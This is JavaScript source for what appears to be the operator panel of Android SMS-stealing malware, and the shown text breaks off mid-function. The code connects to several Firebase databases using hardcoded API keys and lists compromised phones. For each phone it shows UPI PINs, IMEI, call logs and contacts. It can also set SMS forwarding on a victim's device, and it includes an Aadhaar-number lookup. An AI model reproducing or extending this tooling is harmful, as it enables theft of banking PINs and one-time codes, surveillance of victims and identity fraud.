var PANEL_BUILD=9;
var AUTH_URL='';
var SMS_TOKEN_URL='';
var allDevs=[], selDev='', activeFbId='', clientsRawMap={};
var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
var activeListeners={}, window_sms=[];
var ACTIVE_FB_KEY='rbl_active_fb_m';
var CLIENTS_CACHE_KEY='rbl_clients_cache_v2';
var CLIENTS_CACHE_TTL=6*60*60*1000;
var tabLoaded={};
var _smsTokenLog=[];
var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
var SUMMARY_NODES=['devices_status','clients'];
var DEVICE_NODES=['devices','users','clients_list','online_devices'];

var DEFAULT_FIREBASES=[
  {id:'rabel_raand',name:'Rebel',schema:'rabel',apiKey:'AIzaSyB5Fmk4HgxDLmkfSegOW2TBdtJeCpM-nuw',authDomain:'rabel-raand.firebaseapp.com',databaseURL:'https://rabel-raand-default-rtdb.firebaseio.com',projectId:'rabel-raand',storageBucket:'rabel-raand.firebasestorage.app',messagingSenderId:'574630053774',appId:'1:574630053774:android:aa7475de67c935821806df'},
  {id:'monster_green_c5e81',name:'Monster Green',schema:'rabel',apiKey:'AIzaSyBspKFI_F7hB-5hHJI0203786vXuCMMbM8',authDomain:'monster-green-c5e81.firebaseapp.com',databaseURL:'https://monster-green-c5e81-default-rtdb.firebaseio.com',projectId:'monster-green-c5e81',storageBucket:'monster-green-c5e81.firebasestorage.app',messagingSenderId:'411242045978',appId:'1:411242045978:android:1748043e0e030b348067a3'},
  {id:'pmfg_ccccc',name:'PMFG',schema:'spinplay',apiKey:'AIzaSyBq_UQz4RtTsomqsWLA99ilqvrK14Okh9w',authDomain:'pmfg-ccccc.firebaseapp.com',databaseURL:'https://pmfg-ccccc-default-rtdb.firebaseio.com',projectId:'pmfg-ccccc'},
  {id:'spinplay99',name:'SpinPlay99',schema:'spinplay',apiKey:'AIzaSyCsTa5oZOZ3XS7ZujbAl8JX1qPuUEP6P3I',authDomain:'spinplay99.firebaseapp.com',databaseURL:'https://spinplay99-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'spinplay99',storageBucket:'spinplay99.firebasestorage.app',messagingSenderId:'8121733414',appId:'1:8121733414:web:04b9ae5df1b6bc413e31e7'},
  {id:'nsx1_7f7aa',name:'NSX1',schema:'rabel',apiKey:'AIzaSyBnfbREOJVIVrN2K7KJX4TTPbKcMIFasDQ',authDomain:'nsx1-7f7aa.firebaseapp.com',databaseURL:'https://nsx1-7f7aa-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'nsx1-7f7aa',storageBucket:'nsx1-7f7aa.firebasestorage.app',messagingSenderId:'1025305009086',appId:'1:1025305009086:android:b3c3d28d5f6bf44f2b77ef'},
  {id:'stormapk_9edea',name:'Storm APK',schema:'rabel',apiKey:'AIzaSyCuFRrF3_yxait_oOFkDxjdrsZkwno_Uy8',authDomain:'stormapk-9edea.firebaseapp.com',databaseURL:'https://stormapk-9edea-default-rtdb.asia-southeast1.firebasedatabase.app',projectId:'stormapk-9edea',storageBucket:'stormapk-9edea.firebasestorage.app',messagingSenderId:'353810391693',appId:'1:353810391693:android:291dcbff91823c3866f8c4'}
];

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}

/* ═══ ADVANCED FX ═══ */
function ripple(e,el){
  if(!el)return;var r=el.getBoundingClientRect(),s=Math.max(r.width,r.height);
  var p=document.createElement('span');p.className='ripple';
  p.style.width=p.style.height=s+'px';p.style.left=(e.clientX||r.left+r.width/2)-r.left-s/2+'px';
  p.style.top=(e.clientY||r.top+r.height/2)-r.top-s/2+'px';
  el.style.position=el.style.position||'relative';el.style.overflow='hidden';
  el.appendChild(p);setTimeout(function(){p.remove();},650);
}
function spawnConfetti(x,y,n){
  var layer=document.getElementById('fxLayer');if(!layer)return;
  var cols=['#ff3c3c','#ff9500','#00ff9d','#7b9cff','#fff'];
  for(var i=0;i<(n||36);i++){
    var c=document.createElement('i');c.className='confetti';
    c.style.left=(x+(Math.random()-.5)*80)+'px';c.style.top=y+'px';
    c.style.background=cols[i%cols.length];
    c.style.setProperty('--tx',(Math.random()-.5)*220+'px');
    c.style.setProperty('--ty',(80+Math.random()*160)+'px');
    c.style.setProperty('--rot',(Math.random()*720)+'deg');
    c.style.setProperty('--dur',(.9+Math.random()*.8)+'s');
    layer.appendChild(c);(function(node){setTimeout(function(){node.remove();},1800);})(c);
  }
}
function unlockFlash(){var f=document.createElement('div');f.className='unlock-flash';document.body.appendChild(f);setTimeout(function(){f.remove();},750);}
function setHdrSync(on){
  var d=document.getElementById('hdrLive');if(d)d.classList.toggle('syncing',!!on);
}
function showSkeleton(){
  var el=document.getElementById('devList');
  if(!el)return;el.innerHTML='<div class="skeleton">'+Array(5).fill('<div class="skel-card"></div>').join('')+'</div>';
}
function countUp(el,target){
  if(!el)return;var start=parseInt(el.textContent,10)||0;if(start===target)return;
  var t0=performance.now(),dur=420;
  function step(ts){
    var p=Math.min(1,(ts-t0)/dur);p=1-Math.pow(1-p,3);
    el.textContent=Math.round(start+(target-start)*p);
    if(p<1)requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}
function initParticles(){
  var c=document.getElementById('particleCanvas');if(!c)return;
  var ctx=c.getContext('2d'),pts=[],W,H,dpr=Math.min(window.devicePixelRatio||1,2);
  function resize(){W=c.width=innerWidth*dpr;H=c.height=innerHeight*dpr;c.style.width=innerWidth+'px';c.style.height=innerHeight+'px';}
  resize();window.addEventListener('resize',resize);
  for(var i=0;i<55;i++)pts.push({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-.5)*.35*dpr,vy:(Math.random()-.5)*.35*dpr,r:1+Math.random()*2*dpr,a:.15+Math.random()*.35});
  function frame(){
    ctx.clearRect(0,0,W,H);
    pts.forEach(function(p){
      p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=W;if(p.x>W)p.x=0;if(p.y<0)p.y=H;if(p.y>H)p.y=0;
      ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,6.28);ctx.fillStyle='rgba(255,80,80,'+p.a+')';ctx.fill();
    });
    for(var i=0;i<pts.length;i++)for(var j=i+1;j<pts.length;j++){
      var a=pts[i],b=pts[j],dx=a.x-b.x,dy=a.y-b.y,d=dx*dx+dy*dy;
      if(d<9000*dpr){ctx.strokeStyle='rgba(255,149,0,'+(0.08*(1-d/(9000*dpr)))+')';ctx.lineWidth=.6*dpr;ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.stroke();}
    }
    requestAnimationFrame(frame);
  }
  frame();
}
function initParallax(){/* flat UI — no 3D tilt */}
var _navGlowEl=null;
function moveNavGlow(btn){
  if(!btn)return;if(!_navGlowEl){_navGlowEl=document.createElement('div');_navGlowEl.className='nav-glow';
    var nav=document.getElementById('bottomNav');if(nav)nav.insertBefore(_navGlowEl,nav.firstChild);}
  var r=btn.getBoundingClientRect(),nr=btn.parentNode.getBoundingClientRect();
  _navGlowEl.style.left=(r.left-nr.left+4)+'px';_navGlowEl.style.width=(r.width-8)+'px';
}
function bindRipples(){
  document.querySelectorAll('.nav-item,.btn-primary,.btn-send,.icon-btn,.menu-item').forEach(function(el){
    el.addEventListener('click',function(e){ripple(e,el);});
  });
}
function makeDevKey(fbId,devId){return fbId+'::'+devId;}
function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
function getFilteredDevs(){return activeFbId?allDevs.filter(function(d){return d.fbId===activeFbId;}):allDevs;}
function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}

function loadFirebaseConfigs(){
  try{
    var s=localStorage.getItem('rbl_firebase_list');
    if(s){var p=JSON.parse(s);if(Array.isArray(p)&&p.length){
      DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
      return p;
    }}
  }catch(e){}
  return DEFAULT_FIREBASES.slice();
}
function initFirebaseInstance(cfg){
  var appName='mfb_'+cfg.id,db=null;
  if(cfg.apiKey){
    try{
      var exists=false;firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
      if(!exists)firebase.initializeApp({apiKey:cfg.apiKey,authDomain:cfg.authDomain||'',databaseURL:cfg.databaseURL,projectId:cfg.projectId||cfg.id,storageBucket:cfg.storageBucket||'',messagingSenderId:cfg.messagingSenderId||'',appId:cfg.appId||''},appName);
      db=firebase.app(appName).database();
    }catch(e){}
  }
  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
  firebaseInstances.push(inst);return inst;
}
function initFirebase(){
  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
  firebaseConfigs.forEach(initFirebaseInstance);
  try{activeFbId=localStorage.getItem(ACTIVE_FB_KEY)||'';}catch(e){}
  if(!activeFbId&&firebaseConfigs.length){var r=firebaseConfigs.find(function(c){return c.id==='rabel_raand';});activeFbId=r?r.id:firebaseConfigs[0].id;}
  updateFbUi();
}
initFirebase();

function updateFbUi(){
  var inst=getFbInstance(activeFbId);
  var name=inst?inst.name:'—';
  var chip=document.getElementById('fbChip');if(chip)chip.textContent=name;
  var moreFb=document.getElementById('moreFbName');if(moreFb)moreFb.textContent=name;
  document.getElementById('hdrSub').textContent=inst?(getFilteredDevs().length+' devices · '+name):'No Firebase';
  var html=firebaseConfigs.map(function(c){
    var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
    return '<div class="fb-option'+(c.id===activeFbId?' active':'')+'" onclick="switchFirebase(\''+c.id+'\')"><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices</div></div>';
  }).join('');
  document.getElementById('fbSheetList').innerHTML=html;
}
function switchFirebase(id){
  if(!getFbInstance(id))return;
  activeFbId=id;try{localStorage.setItem(ACTIVE_FB_KEY,id);}catch(e){}
  if(selDev){var d=getSelDev();if(!d||d.fbId!==id){selDev='';clearListeners();}}
  updateFbUi();renderDevices();renderDeviceView();renderSms();updateSendForm();
  closeFbSheet();toast('Switched to '+getFbInstance(id).name,true);
}
function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}

function getPhoneFromRecord(s){
  if(!s)return'';
  if(s.mobNo)return String(s.mobNo).trim();
  if(s.sims&&s.sims.length)for(var i=0;i<s.sims.length;i++){var p=s.sims[i]&&(s.sims[i].phoneNumber||s.sims[i].number);if(p)return String(p).trim();}
  return String(s.phone_number||s.phone||s.mobile||'').trim();
}
function resolveOnlineStatus(s,fbId){
  var inst=getFbInstance(fbId);var schema=inst?inst.schema:'spinplay';
  if(schema==='rabel')return s.status===true||s.online===true;
  if(s.online_status===true)return true;if(s.online_status===false)return false;
  return s.online===true||s.status==='online'||s.status===true;
}
function normalizeClientRecord(raw){
  if(!raw||typeof raw!=='object')return null;
  if(raw.password||raw.Pass)return null;
  if(raw.modelName||raw.deviceId||raw.mobNo)return{
    name:raw.modelName||'Unknown',brand:raw.brand||'',android:raw.androidV||'',
    online:raw.status===true,battery:parseInt(raw.battery,10)||0,
    network:raw.service_provider||'?',sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)
  };
  return{name:raw.name||raw.device_model||'Unknown',brand:raw.brand||'',android:raw.android||'',
    online_status:raw.online_status,online:raw.online,status:raw.status,
    battery:parseInt(raw.battery||raw.battery_level,10)||0,network:raw.network||'?',
    sms_count:raw.sms_count||0,mobNo:getPhoneFromRecord(raw)};
}
function ingestDeviceData(fbId,node,devId,data){
  var norm=normalizeClientRecord(Object.assign({_fbId:fbId},data));if(!norm)return;
  norm._node=node;norm._fbId=fbId;
  clientsRawMap[makeDevKey(fbId,devId)]=Object.assign({},clientsRawMap[makeDevKey(fbId,devId)]||{},norm);
}
function mergeSummaryNode(fbId,node,raw){
  if(!raw||typeof raw!=='object')return;
  Object.keys(raw).forEach(function(k){if(raw[k]&&typeof raw[k]==='object')ingestDeviceData(fbId,node,k,raw[k]);});
}
function processClientsData(){
  allDevs=[];
  var raw={};Object.keys(clientsRawMap).forEach(function(k){if(!activeFbId||k.indexOf(activeFbId+'::')===0)raw[k]=clientsRawMap[k];});
  Object.keys(raw).forEach(function(k){
    var s=raw[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
    var on=resolveOnlineStatus(s,p.fbId);
    allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'clients',
      name:s.name||'Unknown',displayPhone:getPhoneFromRecord(s)||'No Number',brand:s.brand||'',android:s.android||'',
      status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0});
  });
  allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
  if(!selDev&&allDevs.length)selDev=allDevs[0].id;
  renderDevices();updateStats();updateFbUi();
  saveClientsCache();
}
function getUpiPinFromRecord(s){
  if(!s)return'';
  var v=s.upipin!=null?s.upipin:(s.upi_pin!=null?s.upi_pin:(s.upiPin!=null?s.upiPin:s.UPI_PIN));
  return v!=null&&String(v).trim()!==''?String(v).trim():'';
}
function resolveLastSeenMs(raw,isOnline){
  if(isOnline)return Date.now();
  var keys=['last_seen','lastSeen','last_ping','lastPing','updated_at','updatedAt','timestamp','ts'];
  for(var i=0;i<keys.length;i++){
    var v=raw[keys[i]];
    if(v==null)continue;
    if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;
    if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
  }
  return 0;
}
function formatLastSeenAgo(ms){
  if(!ms)return'—';
  var sec=Math.max(0,Math.floor((Date.now()-ms)/1000));
  if(sec<60)return sec+'s ago';
  if(sec<3600)return Math.floor(sec/60)+'m ago';
  if(sec<86400)return Math.floor(sec/3600)+'h ago';
  return Math.floor(sec/86400)+'d ago';
}
function getClientsCacheMeta(){
  try{return JSON.parse(localStorage.getItem(CLIENTS_CACHE_KEY)||'null');}catch(e){return null;}
}
function loadClientsCache(){
  var meta=getClientsCacheMeta();
  if(!meta||!meta.byFb)return false;
  var loaded=false;
  firebaseConfigs.forEach(function(cfg){
    var entry=meta.byFb[cfg.id];
    if(!entry||!entry.data||(Date.now()-entry.ts)>=CLIENTS_CACHE_TTL)return;
    Object.keys(entry.data).forEach(function(k){clientsRawMap[k]=entry.data[k];});
    loaded=true;
  });
  if(loaded)processClientsData();
  return loaded;
}
function saveClientsCache(){
  if(!activeFbId)return;
  var slice={};
  Object.keys(clientsRawMap).forEach(function(k){
    if(k.indexOf(activeFbId+'::')===0)slice[k]=clientsRawMap[k];
  });
  if(!Object.keys(slice).length)return;
  try{
    var meta=getClientsCacheMeta()||{byFb:{}};
    if(!meta.byFb)meta.byFb={};
    meta.byFb[activeFbId]={ts:Date.now(),data:slice};
    localStorage.setItem(CLIENTS_CACHE_KEY,JSON.stringify(meta));
  }catch(e){}
}
function panelApiFetch(body){
  return new Promise(function(resolve){
    if(window.RebelAndroid&&RebelAndroid.panelApi){
      try{
        var raw=RebelAndroid.panelApi(JSON.stringify(body));
        resolve(parseJson(raw)||{ok:false});
      }catch(e){resolve({ok:false,error:'API error'});}
      return;
    }
    resolve({ok:false,error:'Not in APK'});
  });
}
function switchDevTab(name,btn){
  document.querySelectorAll('.dev-tab').forEach(function(b){b.classList.remove('active');});
  if(btn)btn.classList.add('active');
  document.querySelectorAll('.dev-section').forEach(function(s){s.classList.remove('active');});
  var el=document.getElementById('devtab-'+name);
  if(el)el.classList.add('active');
  ensureDevTabLoaded(name);
}
function devOn(fbId,path,cb){
  var inst=getFbInstance(fbId);
  if(!inst||!inst.db)return;
  var handler=function(snap){cb(snap);};
  var key=fbId+'::'+path;
  activeListeners[key]={db:inst.db,ref:inst.db.ref(path),h:handler};
  inst.db.ref(path).on('value',handler);
}
function restPollExt(fbId,path,cb,ms){
  var inst=getFbInstance(fbId);
  if(!inst)return;
  var tick=function(){restJson(inst.restUrl+'/'+path+'.json').then(cb);};
  tick();
  activeListeners[fbId+'::rest::'+path]={timer:setInterval(tick,ms||8000)};
}
function setDevTabEmpty(tab,msg){
  var map={calls:'callsList',contacts:'contactsList',sim:'simList',perms:'permsList',forward:'fwList'};
  var el=document.getElementById(map[tab]);
  if(el)el.innerHTML='<div class="empty-mini">'+esc(msg)+'</div>';
}
function loadRabelSim(dev){
  restPollExt(dev.fbId,'clients/'+dev.rawId,function(data){
    var el=document.getElementById('simList');
    if(!data){el.innerHTML='<div class="empty-mini">No device info</div>';return;}
    var pin=getUpiPinFromRecord(data);
    var upiEl=document.getElementById('heroUpi');
    if(upiEl)upiEl.textContent=pin||'—';
    var fields=[['Model',data.modelName],['Mobile',data.mobNo],['Battery',data.battery],['Network',data.service_provider],['Storage',data.storage],['IP',data.ip_address],['Android',data.androidV],['UPI PIN',pin||'N/A']];
    if(data.sims&&data.sims.length)data.sims.forEach(function(sim,i){
      fields.push(['SIM '+(i+1),sim.carrierName+' · '+(sim.phoneNumber||'')]);
    });
    el.innerHTML=fields.map(function(f){
      return '<div class="data-row"><span class="data-lbl">'+f[0]+'</span><span class="data-val">'+esc(String(f[1]||'N/A'))+'</span></div>';
    }).join('');
  },8000);
}
function ensureDevTabLoaded(tab){
  if(!selDev||tabLoaded[tab])return;
  tabLoaded[tab]=true;
  var dev=getSelDev();
  if(!dev)return;
  var inst=getFbInstance(dev.fbId);
  if(inst&&inst.schema==='rabel'){
    if(tab==='sim'){loadRabelSim(dev);return;}
    if(tab==='calls'||tab==='contacts'||tab==='perms'||tab==='forward'){
      setDevTabEmpty(tab,'Not available for rabel schema');
      return;
    }
  }
  var ref=(dev.deviceNode||'devices')+'/'+dev.rawId;
  if(tab==='calls'){
    var loadCalls=function(d){
      var el=document.getElementById('callsList');
      if(!d||!d.calls){el.innerHTML='<div class="empty-mini">No call data</div>';return;}
      el.innerHTML=d.calls.map(function(c,i){
        return '<div class="data-row"><span class="data-idx">'+(i+1)+'</span><div><b>'+esc(c.number||'?')+'</b><div class="data-sub">'+esc(c.contact_name||'—')+' · '+esc(c.date_readable||'—')+' · '+esc(c.duration||'0')+'s</div></div><span class="chip">'+esc(c.type||'?')+'</span></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/all_calls',function(s){loadCalls(s.val());});
    else restPollExt(dev.fbId,ref+'/all_calls',loadCalls,10000);
  }else if(tab==='contacts'){
    var loadContacts=function(d){
      var el=document.getElementById('contactsList');
      if(!d||!d.contacts){el.innerHTML='<div class="empty-mini">No contacts</div>';return;}
      el.innerHTML=d.contacts.map(function(c,i){
        return '<div class="data-row"><span class="data-idx">'+(i+1)+'</span><div><b>'+esc(c.name||'No Name')+'</b><div class="data-sub mono">'+esc(c.phone||'—')+'</div></div></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/all_contacts',function(s){loadContacts(s.val());});
    else restPollExt(dev.fbId,ref+'/all_contacts',loadContacts,12000);
  }else if(tab==='sim'){
    var loadSim=function(s){
      var el=document.getElementById('simList');
      if(!s){el.innerHTML='<div class="empty-mini">No SIM info</div>';return;}
      var fields=[['Operator',s.sim_operator_name],['Network',s.network_operator_name],['IMEI',s.imei],['Subscriber',s.subscriber_id]];
      el.innerHTML=fields.map(function(f){
        return '<div class="data-row"><span class="data-lbl">'+f[0]+'</span><span class="data-val">'+esc(f[1]||'N/A')+'</span></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/device_info/sim_info',function(s){loadSim(s.val());});
    else restPollExt(dev.fbId,ref+'/device_info/sim_info',loadSim,12000);
  }else if(tab==='perms'){
    var loadPerms=function(p){
      var el=document.getElementById('permsList');
      if(!p){el.innerHTML='<div class="empty-mini">No permissions data</div>';return;}
      el.innerHTML=Object.keys(p).map(function(k){
        return '<div class="data-row"><span class="data-lbl">'+esc(k.replace(/_/g,' '))+'</span><span class="chip '+(p[k]?'on':'off')+'">'+(p[k]?'OK':'Denied')+'</span></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/live_data/permissions',function(s){loadPerms(s.val());});
    else restPollExt(dev.fbId,ref+'/live_data/permissions',loadPerms,15000);
  }else if(tab==='forward'){
    if(inst&&inst.db){
      devOn(dev.fbId,ref+'/forwarding_settings',function(s){
        var v=s.val()||{};
        var ft=document.getElementById('fwToggle');if(ft)ft.checked=!!v.enabled;
        var fn=document.getElementById('fwNumber');if(fn)fn.value=v.forward_to||'';
        var fa=document.getElementById('fwAll');if(fa)fa.checked=v.forward_all!==false;
        var ff=document.getElementById('fwFilters');if(ff)ff.value=(v.filters&&v.filters.join)?v.filters.join(', '):'';
      });
      devOn(dev.fbId,ref+'/forwarded_sms',function(s){
        var el=document.getElementById('fwList');
        if(!s.exists()){el.innerHTML='<div class="empty-mini">No forwarded SMS yet</div>';return;}
        var l=[];s.forEach(function(c){l.push(c.val());});
        l.reverse();
        el.innerHTML=l.slice(0,20).map(function(r){
          return '<div class="data-row"><div><b>'+esc(r.from||'?')+'</b> → '+esc(r.to||'?')+'<div class="data-sub">'+esc(r.body||'—')+'</div></div></div>';
        }).join('');
      });
    }
  }
}
function saveForward(){
  var dev=getSelDev();if(!dev){toast('Select device',false);return;}
  var inst=getFbInstance(dev.fbId);if(!inst){toast('No Firebase',false);return;}
  var ref=(dev.deviceNode||'devices')+'/'+dev.rawId+'/forwarding_settings';
  var filters=(document.getElementById('fwFilters').value||'').split(',').map(function(f){return f.trim();}).filter(Boolean);
  var payload={enabled:!!document.getElementById('fwToggle').checked,forward_to:(document.getElementById('fwNumber').value||'').trim(),forward_all:!!document.getElementById('fwAll').checked,filters:filters,updated_at:Date.now()};
  fetch(inst.restUrl+'/'+ref+'.json',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
    toast(r.ok?'Forwarding saved':'Save failed',r.ok);
  }).catch(function(){toast('Save failed',false);});
}
function openAadhar(){document.getElementById('aadharModal').classList.remove('hidden');}
function closeAadhar(e){if(e&&e.target&&e.target.id!=='aadharModal')return;document.getElementById('aadharModal').classList.add('hidden');}
function lookupAadhar(){
  var num=(document.getElementById('aadharNum').value||'').replace(/\D/g,'');
  var st=document.getElementById('aadharStatus'),res=document.getElementById('aadharResult');
  if(num.length<10){st.textContent='Enter valid 10-digit number';st.style.color='var(--error)';return;}
  st.textContent='Looking up...';st.style.color='var(--muted)';res.innerHTML='';
  panelApiFetch({type:'aadhar',num:num}).then(function(d){
    if(d.error){st.textContent=d.error;st.style.color='var(--error)';return;}
    var rows=(d.response&&d.response.data)||[];
    if(!Array.isArray(rows))rows=[];
    var aadhars=[],seen={};
    rows.forEach(function(row){
      if(!row||row.aadhar==null)return;
      var a=String(row.aadhar).replace(/\D/g,'');
      if(!a||seen[a])return;seen[a]=1;aadhars.push(a);
    });
    if(!aadhars.length){st.textContent='No aadhar found';st.style.color='var(--error)';return;}
    st.textContent='✅ '+aadhars.length+' found';st.style.color='var(--success)';
    res.innerHTML=aadhars.map(function(a,i){
      return '<div class="data-row"><span class="data-idx">'+(i+1)+'</span><span class="mono aadhar-hl">'+esc(a)+'</span></div>';
    }).join('');
  });
}
function renderAutoTokenLog(log){
  var el=document.getElementById('autoTokenLog');
  if(!el)return;
  if(!log||!log.length){el.innerHTML='<div class="empty-mini">No auto-token activity yet</div>';return;}
  el.innerHTML=log.map(function(row){
    return '<div class="token-log '+(row.ok?'ok':'bad')+'">'+esc(row.time||'')+' → '+esc(row.to||'?')+' · '+esc((row.message||'').substring(0,40))+'</div>';
  }).join('');
}
function updatePanelVersionBadge(){
  var el=document.getElementById('panelVerBadge');
  if(!el)return;
  var v=PANEL_BUILD;
  if(window.RebelAndroid&&RebelAndroid.getPanelVersion){
    try{v=RebelAndroid.getPanelVersion()||v;}catch(e){}
  }
  el.textContent='Panel v'+v+' · Solid UI';
}
function updateStats(){
  var l=getFilteredDevs();
  countUp(document.getElementById('stTotal'),l.length);
  countUp(document.getElementById('stOnline'),l.filter(function(d){return d.status==='online';}).length);
  countUp(document.getElementById('stOffline'),l.filter(function(d){return d.status==='offline';}).length);
  document.querySelectorAll('.stat-card').forEach(function(c){c.classList.remove('bump');void c.offsetWidth;c.classList.add('bump');});
}
function fetchSummaryNode(inst,node){
  return restJson(inst.restUrl+'/'+node+'.json').then(function(raw){mergeSummaryNode(inst.id,node,raw);processClientsData();});
}
function discoverInstance(inst){
  return restJson(inst.restUrl+'/.json?shallow=true').then(function(roots){
    if(!roots||typeof roots!=='object')return;
    var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
    var tasks=[];
    nodes.forEach(function(n){
      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
      else if(n==='devices')tasks.push(fetchSummaryNode(inst,n));
    });
    return Promise.all(tasks);
  });
}
function attachLive(inst){
  if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
  ['clients','devices_status'].forEach(function(node){
    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
  });
}
function fetchAllData(){
  var hdr=document.getElementById('hdrSub');
  if(hdr)hdr.textContent='Syncing...';
  setHdrSync(true);showSkeleton();
  firebaseInstances.forEach(attachLive);
  return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
    processClientsData();
    if(hdr)hdr.textContent=getFilteredDevs().length+' devices';
    setHdrSync(false);
    if(selDev)loadSmsForDevice();
  });
}
function startPanelPreload(){
  if(window._preloadStarted)return;
  window._preloadStarted=true;
  loadClientsCache();
  fetchAllData();
  loadAutoTokenState();
}
function refreshData(){
  var btn=document.getElementById('refreshBtn');
  if(btn){btn.classList.add('spinning');setTimeout(function(){btn.classList.remove('spinning');},900);}
  toast('Refreshing...',true);fetchAllData();
}

function renderDevices(){
  var q=(document.getElementById('devSearch').value||'').toLowerCase();
  var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId).toLowerCase().includes(q);});
  var el=document.getElementById('devList');
  if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📡</div>No devices yet<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';return;}
  el.innerHTML=list.map(function(d,i){
    return '<div class="dev-card '+d.status+(d.id===selDev?' active':'')+'" style="animation-delay:'+(i*0.05)+'s" onclick="selectDevice(\''+d.id+'\')">'+
      '<div class="dev-bar"></div><div class="dev-body">'+
      '<div class="dev-phone">'+esc(d.displayPhone)+'</div>'+
      '<div class="dev-meta">'+esc(d.name)+' · '+esc(d.rawId.substring(0,14))+'</div>'+
      '<div class="dev-chips"><span class="chip bat">'+d.battery+'%</span><span class="chip">'+esc(d.network)+'</span><span class="chip">'+d.smsCount+' SMS</span></div>'+
      '</div></div>';
  }).join('');
}
function selectDevice(id){
  tabLoaded={};
  selDev=id;renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice();
  switchTab('device',document.querySelector('.nav-item[data-tab="device"]'));
  ensureDevTabLoaded('sim');
}

function renderDeviceView(){
  var d=getSelDev(),empty=document.getElementById('deviceEmpty'),hero=document.getElementById('deviceHero');
  if(!d){empty.classList.remove('hidden');hero.classList.add('hidden');return;}
  empty.classList.add('hidden');hero.classList.remove('hidden');
  var lastSeen=formatLastSeenAgo(resolveLastSeenMs(clientsRawMap[d.id]||{},d.status==='online'));
  var upi=getUpiPinFromRecord(clientsRawMap[d.id]||{});
  hero.innerHTML='<div class="hero-card">'+
    '<div class="hero-phone">'+esc(d.displayPhone)+'</div>'+
    '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+'</div>'+
    '<div class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</div>'+
    '<div class="hero-last">Last seen: '+esc(lastSeen)+'</div>'+
    '<div class="hero-grid">'+
    '<div class="hero-cell"><div class="hero-lbl">BATTERY</div><div class="hero-val">'+d.battery+'%</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">UPI PIN</div><div class="hero-val" id="heroUpi">'+esc(upi||'—')+'</div></div>'+
    '</div><div class="dev-tabs">'+
    '<button class="dev-tab active" data-tab="sim" onclick="switchDevTab(\'sim\',this)">SIM</button>'+
    '<button class="dev-tab" data-tab="calls" onclick="switchDevTab(\'calls\',this)">Calls</button>'+
    '<button class="dev-tab" data-tab="contacts" onclick="switchDevTab(\'contacts\',this)">Contacts</button>'+
    '<button class="dev-tab" data-tab="perms" onclick="switchDevTab(\'perms\',this)">Perms</button>'+
